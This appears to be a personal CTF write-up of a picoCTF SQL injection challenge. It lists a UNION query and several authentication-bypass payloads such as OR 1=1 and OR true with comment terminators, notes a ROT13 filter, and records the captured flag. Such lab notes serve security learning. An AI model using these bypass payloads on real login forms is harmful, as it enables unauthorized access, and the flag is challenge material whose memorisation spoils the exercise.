```sql
SELECT * FROM LAVADA WHERE username='admin' AND password='' UNION SELECT * FROM * WHERE username='admin'
```
[SQL Injection: Bypassing Common Filters - PortSwigger](https://portswigger.net/support/sql-injection-bypassing-common-filters)
[SQL injection cheat sheet | Web Security Academy (portswigger.net)](https://portswigger.net/web-security/sql-injection/cheat-sheet)
[SQL Injection Prevention - OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
[SQL injection UNION attacks | Web Security Academy (portswigger.net)](https://portswigger.net/web-security/sql-injection/union-attacks)

``` SQL
SELECT * FROM LAVADA WHERE username='admin' AND password=password_hash($password, PASSWORD_BCRYPT);
```

`"hi", PASSWORD_BCRYPT); OR 1=1--`
`"hi", PASSWORD_BCRYPT); OR 1=1 /*`
`"hi", PASSWORD_BCRYPT); OR true /*`
`"hi", PASSWORD_BCRYPT) OR true --`
`[], PASSWORD_BCRYPT); OR true --`
`[], PASSWORD_BCRYPT) OR true --`
`"hi", PASSWORD_BCRYPT) -ORDER BY 2 /*`

NOW I ENTERED ALL CHARS IN abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ AND found its a ROT 13 so entered this

![[Pasted image 20230130145736.png]]

![[Pasted image 20230130145641.png]]
``picoCTF{3v3n_m0r3_SQL_4424e7af}``
